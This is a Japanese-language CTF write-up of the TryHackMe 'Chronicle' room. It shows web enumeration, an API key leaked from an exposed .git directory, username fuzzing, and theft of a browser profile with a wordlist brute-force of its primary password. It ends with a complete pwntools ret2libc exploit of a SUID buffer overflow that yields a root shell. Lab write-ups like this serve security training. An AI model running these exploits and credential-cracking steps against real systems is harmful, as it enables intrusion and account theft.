# Chronicle CTF

https://tryhackme.com/room/chronicle

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.180.254
root@ip-10-10-231-40:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-06 00:01 BST
Nmap scan report for 10.10.180.254
Host is up (0.029s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8081/tcp open  blackice-icecap
MAC Address: 02:DC:F0:48:80:67 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 11.65 seconds
root@ip-10-10-231-40:~# sudo nmap -sV -p22,80,8081 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-06 00:02 BST
Nmap scan report for 10.10.180.254
Host is up (0.0073s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
8081/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
MAC Address: 02:DC:F0:48:80:67 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.82 seconds
```

SSH、HTTP（80、8081）  
80のWeb表示したら「OLD」と表示される。

80, 8081ともにサブドメインは発見できなかった。

### gobuster 80

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -x=txt,php -u http://$TARGET -w ./dirlist.txt -t 30 -k

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.txt        (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/old                  (Status: 301) [Size: 312] [--> http://10.10.180.254/old/]
/server-status        (Status: 403) [Size: 278]
Progress: 681570 / 681573 (100.00%)
===============================================================
Finished
===============================================================
```

/old を発見

/old/note.txt
```
Everything has been moved to new directory and the webapp has been deployed
```
8081ポートが移動先ということか？

## 8081

ログイン画面は機能していないように見えるが、パスワード忘れ画面が残っている。

http://10.10.180.254:8081/static/js/forget.js
```js
function api(){
    var xhttp = new XMLHttpRequest();
    var data=document.getElementById("username").value;
    console.log(data);
    xhttp.open("POST", "/api/"+data, true);
    xhttp.setRequestHeader("Content-type", "application/json");
    xhttp.send('{"key":"NULL"}')       //Removed the API Key to stop the forget password functionality 
}
```
コード上、APIキーは削除されている。入手したい。列挙かブルートフォースか。

```shell
$ ffuf -u http://chronicle.thm:8081/api/username -c -w /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt -X POST -d '{"key":"FUZZ"}' -fr "Invalid API Key" -H 'Content-Type: application/json'
```
ブルートフォースではヒットしなかった。

```shell
$ dirsearch -u http://chronicle.thm/old     
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                    
 (_||| _) (/_(_|| (_| )                                                                                             
                                                                                                                    
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/CTF/0506/reports/http_chronicle.thm/_old_25-05-05_20-41-15.txt

Target: http://chronicle.thm/

[20:41:15] Starting: old/                                                                                           
[20:41:27] 301 -  317B  - /old/.git  ->  http://chronicle.thm/old/.git/     
[20:41:27] 200 -   23B  - /old/.git/HEAD                                    
[20:41:27] 200 -  638B  - /old/.git/hooks/                                  
[20:41:27] 200 -   15B  - /old/.git/COMMIT_EDITMSG
```

oldディレクトリの中に .git ディレクトリがあることが分かった。  
ダウンロード

```shell
wget -r -np -e robots=off --content-disposition --trust-server-names http://chronicle.thm/old/.git/
```

app.py ログ

```python
-from flask import Flask, render_template, request
-
-app = Flask(__name__)
-
-@app.route('/')
-def index():
-    return render_template('index.html')
-
-@app.route('/login')
-def login():
-    return render_template('login.html')
-
-@app.route('/api/')
-@app.route('/api')
-def api():
-    return "API Action Missing"
-
-@app.route('/api/<uname>',methods=['POST'])
-def info(uname):
-    if(uname == ""):
-        return "Username not provided"
-    print("OK")
-    data=request.get_json(force=True)
-    print(data)
-    if(data['key']=='7454c262d0d5a3a0c0b678d6c0dbc7ef'):
-        if(uname=="admin"):
-            return '{"username":"admin","password":"password"}'     #Default Change them as required
-        elif(uname=="someone"):
-            return '{"username":"someone","password":"someword"}'   #Some other user
-        else:
-            return 'Invalid Username'
-    else:
-        return "Invalid API Key"
-
-@app.route('/forgot')
-def forgot():
-    return render_template('forgot.html')
-
-app.run(host='0.0.0.0')
```

試してみると、キーは正しかったが、adminユーザーは存在しなかった。

```shell
$ curl -v -X POST -H "Content-Type: application/json" -d '{"key":"7454c262d0d5a3a0c0b678d6c0dbc7ef"}' http://chronicle.thm:8081/api/admin
Note: Unnecessary use of -X or --request, POST is already inferred.
* Host chronicle.thm:8081 was resolved.
* IPv6: (none)
* IPv4: 10.10.180.254
*   Trying 10.10.180.254:8081...
* Connected to chronicle.thm (10.10.180.254) port 8081
* using HTTP/1.x
> POST /api/admin HTTP/1.1
> Host: chronicle.thm:8081
> User-Agent: curl/8.13.0
> Accept: */*
> Content-Type: application/json
> Content-Length: 42
> 
* upload completely sent off: 42 bytes
* HTTP 1.0, assume close after body
< HTTP/1.0 200 OK
< Content-Type: text/html; charset=utf-8
< Content-Length: 16
< Server: Werkzeug/1.0.1 Python/3.6.9
< Date: Tue, 06 May 2025 00:51:20 GMT
< 
* shutting down connection #0
Invalid Username
```

ユーザー名をファジングしたら、tommyユーザーが存在することが分かった。

```shell
$ ffuf -u http://chronicle.thm:8081/api/FUZZ -c -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -X POST -d '{"key":"7454c262d0d5a3a0c0b678d6c0dbc7ef"}' -fr "Invalid Username" -H 'Content-Type: application/json'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://chronicle.thm:8081/api/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Usernames/Names/names.txt
 :: Header           : Content-Type: application/json
 :: Data             : {"key":"7454c262d0d5a3a0c0b678d6c0dbc7ef"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Invalid Username
________________________________________________

tommy                   [Status: 200, Size: 49, Words: 1, Lines: 1, Duration: 253ms]
:: Progress: [10177/10177] :: Job [1/1] :: 73 req/sec :: Duration: [0:02:47] :: Errors: 0 ::
```

tommyユーザーのパスワードをリクエスト

```shell
$ curl -v -X POST -H "Content-Type: application/json" -d '{"key":"7454c262d0d5a3a0c0b678d6c0dbc7ef"}' http://chronicle.thm:8081/api/tommy
Note: Unnecessary use of -X or --request, POST is already inferred.
* Host chronicle.thm:8081 was resolved.
* IPv6: (none)
* IPv4: 10.10.180.254
*   Trying 10.10.180.254:8081...
* Connected to chronicle.thm (10.10.180.254) port 8081
* using HTTP/1.x
> POST /api/tommy HTTP/1.1
> Host: chronicle.thm:8081
> User-Agent: curl/8.13.0
> Accept: */*
> Content-Type: application/json
> Content-Length: 42
> 
* upload completely sent off: 42 bytes
* HTTP 1.0, assume close after body
< HTTP/1.0 200 OK
< Content-Type: text/html; charset=utf-8
< Content-Length: 49
< Server: Werkzeug/1.0.1 Python/3.6.9
< Date: Tue, 06 May 2025 00:56:40 GMT
< 
* shutting down connection #0
{"username":"tommy","password":"ひみつ"}
```

この認証情報を使い、SSH接続できた。

```shell
tommy@incognito:~$ cat user.txt
7ba.............................
```

フラグ１ゲット。

## 権限昇格

carlJユーザーのFirefoxプロフィールがある。

```shell
tommy@incognito:~$ ls -al /home/carlJ/.mozilla/firefox/
total 32
drwxr-xr-x  6 carlJ carlJ 4096 Mar 28  2021  .
drwxr-xr-x  5 carlJ carlJ 4096 Mar 28  2021  ..
drwxr-xr-x 13 carlJ carlJ 4096 Apr  3  2021  0ryxwn4c.default-release
drwxr-xr-x  2 carlJ carlJ 4096 Mar 28  2021  45ir4czt.default
drwxr-xr-x  3 carlJ carlJ 4096 Mar 28  2021 'Crash Reports'
-rwxr-xr-x  1 carlJ carlJ   62 Mar 28  2021  installs.ini
drwxr-xr-x  2 carlJ carlJ 4096 Mar 28  2021 'Pending Pings'
-rwxr-xr-x  1 carlJ carlJ  259 Mar 28  2021  profiles.ini
```

zip圧縮してローカルにコピー
```shell
zip -r /tmp/firefox.zip /home/carlJ/.mozilla/firefox
```

Firefoxで開けたが、パスワード等表示するにはプライマリパスワードが必要で参照できなかった。
```shell
firefox --profile ./firefox/0ryxwn4c.default-release --allow-downgrade
```

firefox_decrypt というツールを試したが、プライマリパスワードをクラックしてくれるわけではなく、入力が必要。  
ここで行き詰ってウォークスルーを見たが、password1 を手作業で探すしかないようだ。（→シェルスクリプトで制御する方法があった。振り返りで後述）  
手作業で探すならFirefox上で入力しても同じなので、このツールを使うメリットはあまりないと感じた。

```shell
$ git clone https://github.com/unode/firefox_decrypt.git

$ python ./firefox_decrypt.py ../firefox
Select the Mozilla profile you wish to decrypt
1 -> 45ir4czt.default
2 -> 0ryxwn4c.default-release
2

Primary Password for profile ../firefox/0ryxwn4c.default-release: 

Website:   https://incognito.com
Username: 'dev'
Password: 'ひみつ'
```

このパスワードを使い、suコマンドで carlJ ユーザーに昇格できた。

## 権限昇格２

mailing ディレクトリに、root の SUID ファイルがあった。

```shell
carlJ@incognito:~$ ls -al ./mailing/
total 20
drwx------ 2 carlJ carlJ 4096 Apr 16  2021 .
drwxr-xr-x 8 carlJ carlJ 4096 Jun 11  2021 ..
-rwsrwxr-x 1 root  root  8544 Apr  3  2021 smail
```

smail と /lib/x86_64-linux-gnu/libc.so.6 をローカルにダウンロード。

```shell
$ file ./smail                                                          
./smail: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=db3b9e88c12bc14ae66231b1ce6b70b2590d7f48, not stripped

$ ldd ./smail 
        linux-vdso.so.1 (0x00007ffe1a9ed000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fd5b4e44000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fd5b5054000)

$ pwn checksec ./smail                  
[*] '/home/kali/CTF/0506/smail'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

```c
undefined8 main(void)
{
  int local_5c;
  char local_58 [80];
  
  setuid(0);
  puts("What do you wanna do\n1-Send Message\n2-Change your Signature");
  __isoc99_scanf(&DAT_0040085c,&local_5c);
  fgetc(stdin);
  if (local_5c == 1) {
    puts("What message you want to send(limit 80)");
    fgets(local_58,0x50,stdin);
    puts("Sent!");
  }
  else if (local_5c == 2) {
    puts("Write your signature...");
    sig();
  }
  return 0;
}

void sig(void)
{
  char local_48 [64];
  
  gets(local_48);
  puts("Changed");
  return;
}
```

- 1 を選択した場合、使える脆弱性はない
- 2 の場合、sig関数でバッファオーバーフローの脆弱性がある
- NX有効でシェルコードは使えないので、ret2libc を目指す

carlJ ユーザーでpwnを使える環境になっていた。

```shell
carlJ@incognito:~/mailing$ python3
Python 3.6.9 (default, Jan 26 2021, 15:33:00) 
[GCC 8.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/carlJ/.cache/.pwntools-cache-3.6/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
```

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'

context(os = "linux", arch = "amd64")
context.binary = binary = './smail'

elf = ELF(binary)
rop = ROP(elf)

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process()

p.recvuntil(b"Change your Signature")
p.sendline(b"2")

padding = b'A'*(64+8)
payload = padding
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(elf.got.gets)
payload += p64(elf.plt.puts)
payload += p64(elf.symbols.sig)

p.sendlineafter(b"Write your signature...", payload)
p.recvuntil(b"Changed")
p.recvline()
leak = u64(p.recvline().strip().ljust(8,b'\0'))

log.info(f'Gets leak => {hex(leak)}')
libc.address = leak - libc.symbols.gets
log.info(f'Libc base => {hex(libc.address)}')

payload = padding
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(libc.symbols.system)

p.sendline(payload)
p.interactive()
```

エクスプロイト

```shell
carlJ@incognito:~/mailing$ python3 ./task.py 
[*] '/home/carlJ/mailing/smail'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for './smail'
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/home/carlJ/mailing/smail': pid 13745
[*] Gets leak => 0x7ffff7a62190
[*] Libc base => 0x7ffff79e2000
[*] Switching to interactive mode
Changed
$ id
uid=0(root) gid=1002(carlJ) groups=1002(carlJ)
$ ls /root
root.txt
$ cat /root/root.txt
f21..............................
```

ルートフラグゲット

## 振り返り

- リスト可能ディレクトリをディレクトリ検索する発想はなかった。.git ディレクトリが出てくる場合があるのは目から鱗。gobusterでは発見できなかったが、dirsearchが有効だった。
- ターゲットマシンではASLR無効だったため、getsのアドレスをリークさせる必要はなく、1回のペイロード送信でシェルを取得することが可能だった。

```shell
carlJ@incognito:~/mailing$ cat /proc/sys/kernel/randomize_va_space 
0
```

- Firefoxプロフィールのプライマリパスワードを勘で特定するステップが最も難しく感じた。良い方法が無いものかウォークスルーを調査したら、とても賢い人がいた。

https://github.com/Sma-Das/TryHackMe/blob/main/Chronicle/README.md

```shell
git clone https://github.com/unode/firefox_decrypt.git
```

```shell
#!/bin/bash

if [[ ! -f ./firefox_decrypt/firefox_decrypt.py ]]; then
    echo "can't find decrypter"
    exit 1
elif [[ ! -d ./firefox_creds/firefox ]]; then
    echo "cant find cred file"
    exit 2
fi

while read password; do
    if echo -e "2\n$password" | firefox_decrypt/firefox_decrypt.py ./firefox_creds/firefox &>/dev/null; then
        echo "Password found: $password"
        echo -e "2\n$password" | firefox_decrypt/firefox_decrypt.py ./firefox_creds/firefox
        exit 0
    fi
done < /usr/share/wordlists/rockyou.txt
echo "Password not found"
exit 3
```

賢い！

## Tags

#tags:pwn #tags:git
